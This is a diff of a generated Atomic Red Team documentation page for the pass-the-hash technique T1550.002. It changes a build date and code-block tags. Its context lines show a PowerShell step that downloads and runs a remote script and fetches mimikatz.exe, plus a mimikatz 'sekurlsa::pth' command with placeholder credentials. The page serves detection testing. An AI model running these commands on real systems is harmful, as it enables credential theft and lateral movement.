@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1550.002"
 attack_technique_name: "Use Alternate Authentication Material: Pass the Hash"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "ec23cef9-27d9-46e4-a68d-6f75f7b86908"
@@ -70,14 +70,14 @@ Mimikatz executor must exist on disk and at specified location (#{mimikatz_path}
 
 ### Prerequisite Check
 
-```text
+```powershell
 $mimikatz_path = cmd /c echo #{mimikatz_path}
 if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
 $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
@@ -93,7 +93,7 @@ Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
 
 ### Command
 
-```commandprompt
+```cmd
 #{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"
 ```
 
